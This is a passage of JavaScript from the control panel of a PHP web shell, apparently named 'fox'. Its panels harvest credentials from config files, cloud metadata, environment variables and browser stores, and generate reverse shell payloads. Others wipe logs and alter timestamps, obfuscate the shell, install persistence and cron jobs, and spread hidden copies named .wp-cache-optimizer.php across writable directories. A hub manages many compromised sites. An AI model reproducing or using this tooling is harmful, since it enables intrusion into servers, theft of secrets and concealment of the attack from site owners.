        h+='</tbody></table><div class="text-muted mt-8">'+r.rows.length+' rows returned</div>';$('sqlResult').innerHTML=h;
    });
}
function renderWP() {
    $('fileContent').innerHTML='<div class="card"><h3><i class="fab fa-wordpress" style="color:var(--blue)"></i> WordPress Analysis</h3><div id="wpInfo" class="loading"><i class="fas fa-spinner fa-spin"></i><br>Analyzing...</div></div>';
    api('file_search',{path:'.',pattern:'wp-config.php',max:5},function(r){
        if(r.error){$('wpInfo').innerHTML='<span style="color:var(--red)">'+esc(r.error)+'</span>';return;}
        if(!r.results||r.results.length===0){$('wpInfo').innerHTML='<div class="empty-state"><i class="fab fa-wordpress"></i><br>No WordPress installation found</div>';return;}
        var h='<p class="text-muted mb-8">Found '+r.results.length+' wp-config.php file(s)</p><table class="tbl" style="width:100%"><thead><tr><th>Path</th><th>Action</th></tr></thead><tbody>';
        for(var i=0;i<r.results.length;i++){var p=r.results[i].path||r.results[i];h+='<tr><td style="font-size:10px">'+esc(p)+'</td><td><button class="btn btn-sm" onclick="grabWP(\''+esc(p).replace(/'/g,"\\'")+'\')"><i class="fas fa-eye"></i> View</button></td></tr>';}
        h+='</tbody></table><div id="wpContent" class="mt-8"></div>';$('wpInfo').innerHTML=h;
    });
}
function grabWP(p){api('read',{file:p},function(r){if(r.content){$('wpContent').innerHTML='<pre style="background:#08080d;border-radius:5px;padding:12px;font-size:10px;overflow:auto;max-height:400px;white-space:pre-wrap">'+esc(r.content)+'</pre>';}else{$('wpContent').innerHTML='<span class="text-red">Error reading file</span>';}});}
function renderNet() {
    $('fileContent').innerHTML='<div class="card"><h3><i class="fas fa-network-wired" style="color:var(--green)"></i> Network Information</h3><div id="netInfo" class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading...</div></div>';
    api('m',{},function(r){
        if(r.error){$('netInfo').innerHTML='<span style="color:var(--red)">'+esc(r.error)+'</span>';return;}
        $('netInfo').innerHTML='<pre style="background:#08080d;border-radius:5px;padding:12px;font-size:10px;overflow:auto;max-height:500px;white-space:pre-wrap;color:var(--green)">'+esc(r.output||'No output')+'</pre>';
    });
}
function renderProxy() {
    $('fileContent').innerHTML='<div id="proxyPanel"><div class="card"><h3><i class="fas fa-route" style="color:var(--purple)"></i> HTTP Proxy</h3><p class="text-muted mb-8">Forward HTTP requests through this server</p><div style="display:flex;gap:8px;margin-bottom:8px"><input id="proxyUrl" placeholder="https://example.com/api" style="flex:1;background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:8px 12px;font-family:monospace;font-size:12px" value="http://169.254.169.254/latest/meta-data/"/><select id="proxyMethod" style="background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:6px;font-size:11px"><option>GET</option><option>POST</option><option>HEAD</option></select><button class="btn btn-primary" onclick="proxyRequest()"><i class="fas fa-arrow-right"></i> Go</button></div><div id="proxyResult" style="background:#08080d;border-radius:5px;padding:12px;font-size:10px;overflow:auto;max-height:500px;white-space:pre-wrap"></div></div></div>';
}
function proxyRequest(){
    var url=$('proxyUrl').value;if(!url)return;var m=$('proxyMethod').value;$('proxyResult').innerHTML='<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Requesting...</span>';
    api('proxy',{url:url,method:m},function(r){$('proxyResult').innerHTML=(r.error?'<span style="color:var(--red)">'+esc(r.error)+'</span>':'<pre style="color:var(--green);margin:0">'+esc(r.body||'No response')+'</pre>'+(r.headers?'<hr style="border-color:var(--border)"><div class="text-muted" style="font-size:10px">'+esc(r.headers)+'</div>':''));});
}
function renderStealth() {
    $('fileContent').innerHTML='<div id="stealthPanel"><div class="card"><h3><i class="fas fa-user-secret" style="color:var(--green)"></i> Stealth & OPSEC</h3><div class="grid grid-2 mt-8">'+
        '<div class="card"><h4><i class="fas fa-shield-alt" style="color:var(--orange)"></i> Log Cleaning</h4><p class="text-muted">Remove traces from access/error logs</p><button class="btn btn-primary btn-sm mt-8" onclick="stealthClean()"><i class="fas fa-broom"></i> Clean Logs</button><div id="stealthClean" class="mt-8" style="font-size:10px"></div></div>'+
        '<div class="card"><h4><i class="fas fa-clock" style="color:var(--blue)"></i> Timestomping</h4><p class="text-muted">Modify file timestamps</p><input id="stealthFile" placeholder="/path/to/file" style="width:100%;background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:6px;font-size:11px;margin-bottom:4px"><button class="btn btn-primary btn-sm" onclick="stealthTouch()"><i class="fas fa-pen"></i> Set Timestamps</button><div id="stealthTouch" class="mt-8" style="font-size:10px"></div></div>'+
        '<div class="card"><h4><i class="fas fa-user-ninja" style="color:var(--purple)"></i> AMSI/ETW Status</h4><p class="text-muted">Check Windows AMSI & ETW state</p><button class="btn btn-primary btn-sm mt-8" onclick="stealthAmsi()"><i class="fas fa-search"></i> Check</button><div id="stealthAMSI" class="mt-8" style="font-size:10px"></div></div>'+
        '<div class="card"><h4><i class="fas fa-file-signature" style="color:var(--red)"></i> Self-Obfuscation</h4><p class="text-muted">Obfuscate this shell on disk</p><button class="btn btn-primary btn-sm mt-8" onclick="stealthObfuscate()"><i class="fas fa-magic"></i> Obfuscate</button><div id="stealthObf" class="mt-8" style="font-size:10px"></div></div>'+
        '</div></div></div>';
}
function stealthClean(){api('log_cleaner',{action:'scan'},function(r){if(r.error){$('stealthClean').innerHTML='<span style="color:var(--red)">'+esc(r.error)+'</span>';return;}$('stealthClean').innerHTML='<span class="text-muted">'+esc(r.message||'Done')+'</span>';});}
function stealthTouch(){var f=$('stealthFile').value;if(!f)return;$('stealthTouch').innerHTML='<span class="text-muted"><i class="fas fa-spinner fa-spin"></i></span>';api('cmd',{c:(IS_WIN?'copy /b "':'touch "')+f.replace(/"/g,'\\"')+'"+,,'+(IS_WIN?'"':'"')},function(r){$('stealthTouch').innerHTML='<span class="text-muted">Timestamp updated</span>';});}
function stealthAmsi(){$('stealthAMSI').innerHTML='<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Checking...</span>';api('cmd',{c:'powershell -c "(Get-MpPreference).DisableRealtimeMonitoring 2>$null; echo AMSI:(Get-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name EnableLUA 2>$null).EnableLUA"'});setTimeout(function(){$('stealthAMSI').innerHTML='<span class="text-muted">Check initiated</span>';},500);}
function stealthObfuscate(){$('stealthObf').innerHTML='<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Obfuscating...</span>';api('cmd',{c:'php -r "echo base64_encode(gzdeflate(file_get_contents(\\''+IS_WIN?str_replace('\\','\\\\',__FILE__):__FILE__+'\\'))));"'},function(r){if(r.output){$('stealthObf').innerHTML='<span class="text-muted">Obfuscation data generated ('+r.output.length+' chars)</span>';}else{$('stealthObf').innerHTML='<span style="color:var(--red)">Failed</span>';}});}
function doEval() {
    var code=$('evalCode').value;if(!code)return;$('evalOut').innerHTML='<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Running...</span>';
    api('eval',{code:code},function(r){$('evalOut').innerHTML=(r.output?'<pre style="margin:0;color:var(--green)">'+esc(r.output)+'</pre>':'<span class="text-muted">No output</span>')+(r.error?'<pre style="color:var(--red);margin-top:8px">'+esc(r.error)+'</pre>':'');});
}

/* ═══════════════════════════════════════════════════════════════════════════════
   PHASE 6: CREDENTIAL HARVEST
   ═══════════════════════════════════════════════════════════════════════════════ */
function renderHarvest() {
    $('fileContent').innerHTML =
        '<div id="harvestPanel">'+
        '<div class="card mb-8"><h3><i class="fas fa-search" style="color:var(--orange)"></i> Credential File Scanner</h3>'+
        '<p class="text-muted mb-8">Scans common locations for credential/config files</p>'+
        '<textarea id="harvestPaths" rows="1" placeholder="Extra paths (one per line)" style="width:100%;font-size:11px;background:#08080d;border:1px solid var(--border);border-radius:4px;color:var(--text);padding:6px;font-family:monospace">/etc/nginx\n/etc/apache2</textarea>'+
        '<div class="flex gap-4 mt-8"><button class="btn btn-primary" onclick="harvestScan()"><i class="fas fa-search"></i> Scan for Credentials</button>'+
        '<span id="harvestStatus" class="text-muted" style="font-size:11px;line-height:30px"></span></div>'+
        '<div id="harvestResults" class="mt-8"></div></div>'+

        '<div class="grid grid-2">'+
        '<div class="card"><h3><i class="fas fa-cloud" style="color:var(--blue)"></i> Cloud Metadata</h3>'+
        '<button class="btn btn-primary btn-sm mt-8" onclick="harvestCloud()"><i class="fas fa-cloud"></i> Check Cloud</button>'+
        '<div id="harvestCloud" class="mt-8" style="font-size:11px"></div></div>'+

        '<div class="card"><h3><i class="fas fa-globe" style="color:var(--green)"></i> Environment Variables</h3>'+
        '<button class="btn btn-primary btn-sm mt-8" onclick="harvestEnv()"><i class="fas fa-list"></i> Dump Env</button>'+
        '<div id="harvestEnv" class="mt-8" style="font-size:11px;max-height:300px;overflow:auto"></div></div>'+

        '<div class="card"><h3><i class="fas fa-compass" style="color:var(--purple)"></i> Browser Credentials</h3>'+
        '<button class="btn btn-primary btn-sm mt-8" onclick="harvestBrowsers()"><i class="fas fa-search"></i> Check</button>'+
        '<div id="harvestBrowsers" class="mt-8" style="font-size:11px"></div></div>'+
        '</div></div>';
}
function harvestScan() {
    var paths = $('harvestPaths').value.trim();
    $('harvestStatus').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
    $('harvestResults').innerHTML = '';
    api('harvest', {action:'scan', paths:paths}, function(res) {
        if (res.error) { $('harvestStatus').innerHTML = '<span style="color:var(--red)">'+esc(res.error)+'</span>'; return; }
        $('harvestStatus').innerHTML = res.count+' files found';
        if (!res.files || res.files.length === 0) {
            $('harvestResults').innerHTML = '<div class="empty-state"><i class="fas fa-search"></i><br>No credential files found</div>';
            return;
        }
        var h = '<table class="tbl" style="width:100%"><thead><tr><th>File</th><th>Size</th><th>Type</th><th>Action</th></tr></thead><tbody>';
        for (var i = 0; i < res.files.length; i++) {
            var f = res.files[i];
            h += '<tr><td style="font-size:10px">'+esc(f.path)+'</td>'+
                '<td>'+humanSize(f.size)+'</td>'+
                '<td>'+esc(f.type)+'</td>'+
                '<td><button class="btn" style="padding:1px 8px;font-size:10px" onclick="harvestGrab(\''+esc(f.path).replace(/'/g,"\\'")+'\')"><i class="fas fa-eye"></i></button></td></tr>';
        }
        h += '</tbody></table>';
        $('harvestResults').innerHTML = h;
    });
}
function harvestGrab(file) {
    api('harvest', {action:'grab', file:file}, function(res) {
        if (res.error) { showToast(res.error, 'error'); return; }
        var content = atob(res.content);
        showModal(res.name, '<pre style="background:#08080d;border-radius:4px;padding:12px;font-size:10px;overflow:auto;max-height:500px;white-space:pre-wrap">'+esc(content)+'</pre>'+
            '<div class="text-muted mt-4" style="font-size:10px">'+humanSize(res.size)+' | '+esc(res.path)+'</div>');
    });
}
function harvestCloud() {
    $('harvestCloud').innerHTML = '<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Checking...';
    api('harvest', {action:'cloud_meta'}, function(res){
        if (res.error) { $('harvestCloud').innerHTML = '<span style="color:var(--red)">'+esc(res.error)+'</span>'; return; }
        var h = '';
        for (var i = 0; i < res.results.length; i++) {
            var r = res.results[i];
            var cls = r.accessible ? 'color:var(--green)' : 'color:var(--muted)';
            h += '<div style="margin-bottom:8px;padding:6px;background:#0d0d15;border-radius:4px;border:1px solid var(--border)">'+
                '<span style="'+cls+';font-size:11px">'+(r.accessible?'<i class="fas fa-check-circle"></i>':'<i class="fas fa-times-circle"></i>')+' '+esc(r.endpoint)+'</span>'+
                (r.data ? '<pre style="font-size:9px;margin-top:4px;white-space:pre-wrap">'+esc(r.data)+'</pre>' : '')+
                '</div>';
        }
        $('harvestCloud').innerHTML = h;
    });
}
function harvestEnv() {
    $('harvestEnv').innerHTML = '<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Loading...';
    api('harvest', {action:'env'}, function(res){
        if (res.error) { $('harvestEnv').innerHTML = '<span style="color:var(--red)">'+esc(res.error)+'</span>'; return; }
        if (!res.vars || res.vars.length === 0) { $('harvestEnv').innerHTML = '<span class="text-muted">No env vars found</span>'; return; }
        var h = '<table class="tbl" style="width:100%"><thead><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
        for (var i = 0; i < res.vars.length; i++) {
            var v = res.vars[i];
            var val = esc(v.value);
            // Highlight potential secrets
            var isSecret = /pass|key|secret|token|auth/i.test(v.key);
            h += '<tr><td style="'+(isSecret?'color:var(--red);font-weight:600':'')+'">'+esc(v.key)+'</td><td style="font-size:10px;word-break:break-all">'+(isSecret?'<span style="color:var(--red)">'+val+'</span>':val)+'</td></tr>';
        }
        h += '</tbody></table>';
        $('harvestEnv').innerHTML = h;
    });
}
function harvestBrowsers() {
    $('harvestBrowsers').innerHTML = '<span class="text-muted"><i class="fas fa-spinner fa-spin"></i> Checking...';
    api('harvest', {action:'browsers'}, function(res){
        if (res.error) { $('harvestBrowsers').innerHTML = '<span style="color:var(--red)">'+esc(res.error)+'</span>'; return; }
        if (!res.browsers || res.browsers.length === 0) { $('harvestBrowsers').innerHTML = '<span class="text-muted">No browser stores found</span>'; return; }
        var h = '';
        for (var i = 0; i < res.browsers.length; i++) {
            var b = res.browsers[i];
            h += '<div style="margin-bottom:6px;padding:6px;background:#0d0d15;border-radius:4px;border:1px solid var(--border)">'+
                '<strong>'+esc(b.name)+'</strong> '+(b.exists?'<span style="color:var(--green)">found</span>':'')+
                (b.size ? ' <span class="text-muted">('+humanSize(b.size)+')</span>' : '')+
                (b.profiles ? '<div class="text-muted" style="font-size:10px">'+b.profiles.length+' profile(s)</div>' : '')+
                '</div>';
        }
        $('harvestBrowsers').innerHTML = h;
    });
}

/* ═══════════════════════════════════════════════════════════════════════════════
   REVERSE SHELL
   ═══════════════════════════════════════════════════════════════════════════════ */
function renderRev() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:600px">'+
        '<h3><i class="fas fa-skull" style="color:var(--red)"></i> Reverse Shell Generator</h3>'+
        '<p class="text-muted mb-8">Click any payload to select it, then Ctrl+C. Listener: nc -lvnp [PORT]</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="revIP" value="'+(document.location.hostname||'127.0.0.1')+'" style="flex:1">'+
        '<input id="revPort" value="4444" style="width:80px">'+
        '<button class="btn btn-primary" onclick="genRev()">Generate</button></div>'+
        '<div id="revOutput"></div></div>';
}
function genRev() {
    var ip=$('revIP').value, port=parseInt($('revPort').value)||4444;
    api('revshell',{ip:ip,port:port},function(res){
        if(res.error){showToast('Error');return;}
        var h=''; for(var n in res.shells){
            h+='<div class="mb-8"><div style="font-size:11px;color:#888;margin-bottom:2px">'+esc(n)+'</div>'+
                '<pre class="rev-item" style="background:#08080d;border:1px solid var(--border);border-radius:4px;padding:8px;font-size:10px;color:#0f0;white-space:pre-wrap;word-break:break-all" onclick="selectRev(this)">'+esc(res.shells[n])+'</pre></div>';
        }
        $('revOutput').innerHTML=h;
    });
}
function selectRev(el) { var r=document.createRange(); r.selectNodeContents(el); var s=window.getSelection(); s.removeAllRanges(); s.addRange(r); showToast('Copied! Ctrl+C'); }

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   FILE SEARCH
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
function renderSearch() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:800px"><h3><i class="fas fa-search" style="color:var(--blue)"></i> Mass File Search</h3>'+
        '<p class="text-muted mb-8">Recursive content search. Max 500 results, skips files >10MB.</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="fsPath" value="'+ROOT+'" style="flex:2">'+
        '<input id="fsText" placeholder="Search text..." style="flex:2">'+
        '<input id="fsExt" placeholder="Ext (php)" style="width:80px">'+
        '<button class="btn btn-primary" onclick="doFileSearch()"><i class="fas fa-search"></i> Search</button></div>'+
        '<div id="fsResults"></div></div>';
}
function doFileSearch() {
    var p=$('fsPath').value||ROOT, s=$('fsText').value, e=$('fsExt').value;
    if(!s){showToast('Enter search text');return;}
    $('fsResults').innerHTML='<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Searching...</div>';
    api('file_search',{p:p,s:s,e:e},function(res){
        if(res.error){$('fsResults').innerHTML='<div class="text-red">'+esc(res.error)+'</div>';return;}
        if(res.results.length===0){$('fsResults').innerHTML='<div class="empty-state"><i class="fas fa-search"></i><br>No matches</div>';return;}
        var h='<div class="text-green mb-8">'+res.total+' matches</div>';
        for(var i=0;i<res.results.length;i++){var r=res.results[i]; h+='<div style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:6px 10px;margin-bottom:3px;font-size:11px"><span style="color:var(--purple)">'+(i+1)+'.</span> <span>'+esc(r.path)+'</span> <span class="text-muted">('+humanSize(r.size)+', '+r.lines+' lines)</span></div>';}
        $('fsResults').innerHTML=h;
    });
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   LOG CLEANER
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
var _logs = [];
function renderLogs() {
    $('fileContent').innerHTML =
        '<div class="card"><h3><i class="fas fa-broom" style="color:var(--green)"></i> Log Cleaner</h3>'+
        '<p class="text-muted mb-8">Find and wipe access/error logs. Truncates to 0 bytes.</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<button class="btn btn-primary" onclick="scanLogs()"><i class="fas fa-search"></i> Find Logs</button>'+
        '<button class="btn btn-danger" onclick="truncateLogs()"><i class="fas fa-trash"></i> Truncate All</button>'+
        '<span id="logStatus" class="text-muted"></span>'+
        '<label class="text-muted" style="font-size:11px">Min MB: <input id="logMinSize" value="0" style="width:50px;padding:3px 5px"></label></div>'+
        '<div id="logResults"></div></div>';
}
function scanLogs() {
    $('logStatus').innerHTML='<i class="fas fa-spinner fa-spin"></i> Scanning...';
    api('log_cleaner',{action:'find'},function(res){
        if(res.error){$('logResults').innerHTML='<div style="color:var(--red)">'+esc(res.error)+'</div>';return;}
        _logs=res.logs||[];
        if(_logs.length===0){$('logResults').innerHTML='<div class="empty-state"><i class="fas fa-check-circle" style="color:var(--green)"></i><br>No log files found</div>';$('logStatus').textContent='Clean!';return;}
        var h='<div style="color:var(--red)" class="mb-8">Found '+_logs.length+' log files</div>';
        for(var i=0;i<_logs.length;i++){var l=_logs[i]; h+='<div class="flex" style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:5px 10px;margin-bottom:2px;font-size:10px"><span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(l.path)+'</span><span style="width:70px;color:'+(l.size>10485760?'var(--red)':'#888')+'">'+l.size_h+'</span><span style="width:130px;color:#555">'+l.modified+'</span></div>';}
        $('logResults').innerHTML=h;
        var total=_logs.reduce(function(a,b){return a+b.size;},0);
        $('logStatus').textContent=_logs.length+' logs, '+humanSize(total);
    });
}
function truncateLogs() {
    var ms=parseInt($('logMinSize').value)||0;
    if(!confirm('Truncate all log files'+(ms?' >'+ms+'MB':'')+'?'))return;
    api('log_cleaner',{action:'truncate',max_size:ms},function(r){if(r.ok){showToast('Truncated '+r.truncated+' logs');scanLogs();}});
}

/* ═══════════════════════════════════════════════════════════════════════════════
   PERSIST
   ═══════════════════════════════════════════════════════════════════════════════ */
function renderPersist() {
    $('fileContent').innerHTML = '<div id="persistPanel"><div class="card"><h3><i class="fas fa-skull" style="color:var(--red)"></i> Persistence Status</h3><div id="persistStatus"><div class="loading"><i class="fas fa-spinner fa-spin"></i></div></div></div><div class="flex gap-4 mt-8" id="persistActions"></div></div>';
    api('persist',{action:'status'},function(r){
        var s='';
        if(r.error) { s+='<div class="error">'+esc(r.error)+'</div>'; }
        else {
            s+='<table class="tbl" style="width:100%"><thead><tr><th>Method</th><th>Status</th><th>Detail</th></tr></thead><tbody>';
            if(r.methods) {
                for(var k in r.methods) {
                    var m=r.methods[k];
                    s+='<tr><td>'+esc(k)+'</td><td>'+(m.active?'<span style="color:var(--green)">ACTIVE</span>':'<span style="color:var(--muted)">-</span>')+'</td><td>'+esc(m.detail||'')+'</td></tr>';
                }
            }
            s+='</tbody></table>';
            if(r.agent_ready) s+='<div class="mt-8"><span style="color:var(--green)"><i class="fas fa-check-circle"></i> Prepend agent loaded</span></div>';
        }
        $('persistStatus').innerHTML = s;
        // Action buttons
        var a='<button class="btn btn-danger" onclick="confirm(\'Install persistence?\')&&api(\'persist\',{action:\'install\'},function(r){if(r.ok){showToast(\'Persistence installed\');renderPersist();}else showToast(r.error||\'Failed\',\'error\');})"><i class="fas fa-plus-circle"></i> Install</button>';
        a+='<button class="btn" style="background:var(--orange)" onclick="confirm(\'Remove persistence?\')&&api(\'persist\',{action:\'remove\'},function(r){if(r.ok){showToast(\'Persistence removed\');renderPersist();}else showToast(r.error||\'Failed\',\'error\');})"><i class="fas fa-minus-circle"></i> Remove</button>';
        a+='<button class="btn btn-danger" onclick="confirm(\'WIPE ALL traces? This destroys this shell!\')&&api(\'persist\',{action:\'wipe\'},function(r){if(r.ok){showToast(\'Wiped. Redirecting...\');setTimeout(function(){window.location.reload();},1500);}else showToast(r.error||\'Failed\',\'error\');})"><i class="fas fa-trash"></i> Wipe</button>';
        a+='<button class="btn" onclick="api(\'persist\',{action:\'shield\'},function(r){showToast(r.ok?\'Shield '+(r.enabled?'ENABLED':'DISABLED')+'\':r.error||\'Failed\');renderPersist();})"><i class="fas fa-shield-alt"></i> Toggle Shield</button>';
        $('persistActions').innerHTML = a;
    });
}

/* ═══════════════════════════════════════════════════════════════════════════════
   CRON
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
function renderCron() {
    if (IS_WIN) { $('fileContent').innerHTML='<div class="empty-state"><i class="fas fa-clock"></i><br>Cron unavailable on Windows</div>'; return; }
    $('fileContent').innerHTML =
        '<div class="card"><h3><i class="fas fa-clock" style="color:var(--yellow)"></i> Cron Manager</h3>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="cronSchedule" value="* * * * *" style="width:140px;font-family:monospace">'+
        '<input id="cronCmd" placeholder="/path/to/script" style="flex:2">'+
        '<button class="btn btn-success" onclick="addCron()">+ Add</button>'+
        '<button class="btn btn-primary" onclick="loadCrons()"><i class="fas fa-sync"></i></button></div>'+
        '<div id="cronList"></div></div>';
    loadCrons();
}
function loadCrons() {
    $('cronList').innerHTML='<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading crontab...</div>';
    api('cron',{action:'list'},function(res){
        if(res.error){$('cronList').innerHTML='<div style="padding:10px">'+esc(res.error)+'</div>';return;}
        if(!res.crons||res.crons.length===0){$('cronList').innerHTML='<div class="empty-state"><i class="fas fa-inbox"></i><br>No cron jobs</div>';return;}
        var h=''; for(var i=0;i<res.crons.length;i++){h+='<div class="flex mb-8" style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:6px 10px;font-size:11px"><span style="color:#888;width:30px">#'+i+'</span><span style="flex:1;font-family:monospace">'+esc(res.crons[i].line)+'</span><button class="btn" style="padding:1px 6px;font-size:9px;color:var(--red)" onclick="removeCron('+i+')">âœ•</button></div>';}
        $('cronList').innerHTML=h;
    });
}
function addCron() { var s=$('cronSchedule').value.trim(), c=$('cronCmd').value.trim(); if(!c){showToast('Enter command');return;} api('cron',{action:'add',schedule:s,cmd:c},function(r){if(r.ok){showToast('Added');loadCrons();$('cronCmd').value='';}}); }
function removeCron(i){if(!confirm('Remove cron #'+i+'?'))return; api('cron',{action:'remove',idx:i},function(r){if(r.ok){showToast('Removed');loadCrons();}}); }

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   AUTO-SPREAD
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
function renderSpread() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:600px"><h3><i class="fas fa-bolt" style="color:var(--yellow)"></i> Auto-Spread</h3>'+
        '<p class="text-muted mb-8">Deploy copies to all writable subdirectories (max 500 dirs). Filename: .wp-cache-optimizer.php</p>'+
        '<div class="flex flex-wrap gap-4 mb-8"><input id="spreadDir" value="'+ROOT+'" style="flex:2"><button class="btn btn-primary" onclick="doSpread()"><i class="fas fa-rocket"></i> Deploy</button></div>'+
        '<div id="spreadResult"></div></div>';
}
function doSpread() {
    var dir=$('spreadDir').value||ROOT;
    if(!confirm('Deploy shells under '+dir+'?'))return;
    $('spreadResult').innerHTML='<div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Scanning...</div>';
    api('spread',{dir:dir},function(res){
        if(res.error){$('spreadResult').innerHTML='<div class="text-red">'+esc(res.error)+'</div>';return;}
        var h='<div class="text-green mb-8">Deployed '+res.count+' copies</div>';
        for(var i=0;i<res.deployed.length;i++)h+='<div style="background:#0d0d15;border:1px solid var(--border);border-radius:4px;padding:5px 10px;margin-bottom:2px;font-size:10px">'+esc(res.deployed[i])+'</div>';
        $('spreadResult').innerHTML=h;
    });
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   MULTI-SHELL HUB
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
function renderHub() {
    $('fileContent').innerHTML =
        '<div class="card" style="max-width:700px"><h3><i class="fas fa-globe" style="color:var(--purple)"></i> Multi-Shell Hub</h3>'+
        '<p class="text-muted mb-8">Manage multiple shells from one panel. Stored in /tmp/fox_hub.json</p>'+
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="hubUrl" placeholder="http://target.com/wp.php" style="flex:2">'+
        '<input id="hubKey" placeholder="Key" style="width:100px">'+
        '<input id="hubLabel" placeholder="Label" style="width:100px">'+
        '<button class="btn btn-success" onclick="addHub()">+ Add</button>'+
        '<button class="btn btn-primary" onclick="loadHub()"><i class="fas fa-sync"></i></button></div>'+
        '<div id="hubList"><div class="loading"><i class="fas fa-spinner fa-spin"></i><br>Loading...</div></div></div>';
    loadHub();
}
function loadHub() {
    api('hub',{action:'list'},function(res){
        if(res.error){$('hubList').innerHTML='<div class="text-red">'+esc(res.error)+'</div>';return;}
        if(!res.shells||res.shells.length===0){$('hubList').innerHTML='<div class="empty-state"><i class="fas fa-globe"></i><br>No shells</div>';return;}
        var h=''; for(var i=0;i<res.shells.length;i++){var s=res.shells[i];
            h+='<div class="hub-item"><span class="dot" id="hubDot'+i+'"></span>'+
                '<span style="flex:1"><strong>'+esc(s.label)+'</strong><br><span class="text-muted" style="font-size:10px">'+esc(s.url)+'</span></span>'+
                '<button class="btn" style="padding:2px 8px;font-size:10px" onclick="probeHub('+i+')">Probe</button>'+
                '<button class="btn" style="padding:2px 8px;font-size:10px;color:var(--blue)" onclick="window.open(\''+esc(s.url)+'?k='+esc(s.key)+'\',\'_blank\')">Open</button>'+
                '<button class="btn" style="padding:2px 8px;font-size:10px;color:var(--red)" onclick="removeHub('+i+')">âœ•</button></div>';}
        $('hubList').innerHTML=h;
        for(var i=0;i<res.shells.length;i++)probeHub(i);
    });
}
function addHub() {
    var url=$('hubUrl').value.trim(), key=$('hubKey').value.trim(), label=$('hubLabel').value.trim()||url;
    if(!url){showToast('Enter URL');return;}
    api('hub',{action:'add',url:url,key:key,label:label},function(r){if(r.ok){showToast('Added!');$('hubUrl').value='';$('hubKey').value='';$('hubLabel').value='';loadHub();}});
}
function probeHub(idx) {
    api('hub',{action:'list'},function(res){
        if(!res.shells||!res.shells[idx])return;
        var s=res.shells[idx]; var dot=$('hubDot'+idx); if(dot)dot.className='dot';
        api('hub',{action:'probe',target:s.url,tkey:s.key},function(pr){
            if(dot){dot.className='dot '+(pr&&pr.alive?'alive':'dead');dot.title=pr&&pr.hostname||'?';}
        });
    });
}
function removeHub(idx){if(!confirm('Remove shell #'+idx+'?'))return; api('hub',{action:'remove',idx:idx},function(){loadHub();});}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   BENCHMARK
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
function renderBench() {
